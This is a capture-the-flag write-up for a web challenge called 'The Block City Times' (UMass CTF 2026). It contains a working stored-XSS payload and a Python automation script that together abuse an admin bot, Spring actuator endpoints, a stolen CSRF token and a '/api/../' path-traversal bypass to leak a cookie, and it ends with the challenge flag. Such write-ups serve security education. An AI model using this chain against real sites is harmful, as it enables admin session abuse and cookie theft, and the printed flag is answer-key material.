# The Block City Times (web / XSS)

Category: web medium xss  
CTF: UMass CTF 2026

## Challenge Summary
Target app URL was a per-team instance. Source was provided in `DOWNLOADABLE_ASSETS.zip`.

Core idea:
- User uploads a file via `/submit`.
- Editorial bot (Puppeteer) logs in as admin and visits uploaded file URL `/files/{filename}`.
- Report bot (also admin) sets cookie `FLAG=<flag>` then visits a chosen endpoint.
- If we can execute JS in bot context, we can chain actions to make report bot visit our XSS page and leak `FLAG`.

## Source Analysis
Important files:
- `editorial/server.js`
  - Logs in as admin, then `page.goto(fileUrl)` where `fileUrl = /files/{filename}`.
  - Reads uploaded file as DOM (`document.body.innerHTML`) after load.
- `developer/report-api.js`
  - Logs in as admin.
  - Sets cookie: `FLAG = process.env.FLAG`.
  - Visits endpoint `${BASE_URL}${REPORT_ENDPOINT}`.
- `src/main/java/.../StoryController.java`
  - `/submit` accepts `text/plain` and stores arbitrary file bytes.
  - `/files/{filename}` serves file back with probed content-type.
- `src/main/java/.../admin/ReportController.java`
  - Admin can trigger report runner for endpoint beginning `/api/`.
- `SecurityConfig.java`
  - `/admin/**`, `/files/**`, `/api/config/**` need admin auth.
  - CSRF disabled for `/api/**`.

## Exploit Plan
1. Upload an HTML/JS payload as `text/plain` file through `/submit`.
2. Editorial bot logs in as admin and opens `/files/<ourfile>` -> JS executes in authenticated admin session.
3. Payload does:
   - Force app into dev mode using actuator refresh path:
     - `POST /actuator/env` with `app.active-config=dev`
     - `POST /actuator/refresh`
   - Read admin CSRF token from `/admin` page.
   - Trigger `/admin/report` with endpoint pointing back to our uploaded file using traversal prefix `/api/../files/...` (passes startsWith('/api/')).
4. Report bot logs in, sets `FLAG` cookie, visits our file endpoint.
5. Same payload executes again, now sees `document.cookie` with `FLAG=...` and writes it into public data via:
   - `PUT /api/tags/article/1` body `['FLAG=<value>']`
6. Attacker polls public endpoint `/api/tags/article/1` and extracts `UMASS{...}`.

## Working Payload
```html
<!doctype html><meta charset=utf-8><script>
(async()=>{
  const ck=document.cookie||'';
  const m=ck.match(/FLAG=([^;]+)/);
  if(m){
    await fetch('/api/tags/article/1',{
      method:'PUT',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify(['FLAG='+decodeURIComponent(m[1])])
    });
    return;
  }
  try{
    await fetch('/actuator/env',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({name:'app.active-config',value:'dev'})
    });
    await fetch('/actuator/refresh',{method:'POST'});

    const a=await (await fetch('/admin')).text();
    const t=a.match(/name="_csrf"\s+value="([^"]+)"/);
    if(!t) return;

    const b=new URLSearchParams();
    b.append('_csrf',t[1]);
    b.append('endpoint','/api/../'+location.pathname.replace(/^\//,''));
    await fetch('/admin/report',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:b.toString()
    });
  }catch(e){}
})();
</script>
```

## Automation Script (used)
```python
import re
import time
import requests

BASE='http://<team-instance>.blockcitytimes.web.ctf.umasscybersec.org'
TEAM_TOKEN='ctfd_...'

s=requests.Session()

# token gate (if shown)
r=s.get(BASE+'/',timeout=20)
csrf=re.search(r'name="csrf_token"\s+value="([^"]+)"',r.text)
if csrf and 'ctfd_team_access_token' in r.text:
    s.post(BASE+'/',data={
        'csrf_token':csrf.group(1),
        'ctfd_team_access_token':TEAM_TOKEN
    },allow_redirects=True,timeout=20)

# get submit CSRF
r=s.get(BASE+'/submit',timeout=20)
m=re.search(r'name="([^"]*csrf[^"]*)"\s+value="([^"]+)"',r.text,re.I)
csrf_name, csrf_val = m.group(1), m.group(2)

payload = """<the html payload above>"""

files={'file':('tip.html', payload, 'text/plain')}
data={
    'title':'Urgent tip',
    'author':'Fsociety',
    'description':'please review',
    csrf_name: csrf_val,
}
s.post(BASE+'/submit',data=data,files=files,timeout=30)

for _ in range(90):
    t=s.get(BASE+'/api/tags/article/1',timeout=15)
    f=re.search(r'UMASS\{[^}]+\}',t.text)
    if f:
        print(f.group(0))
        break
    time.sleep(2)
```

## Final Flag
`UMASS{A_mAn_h3s_f@l13N_1N_tH3_r1v3r}`
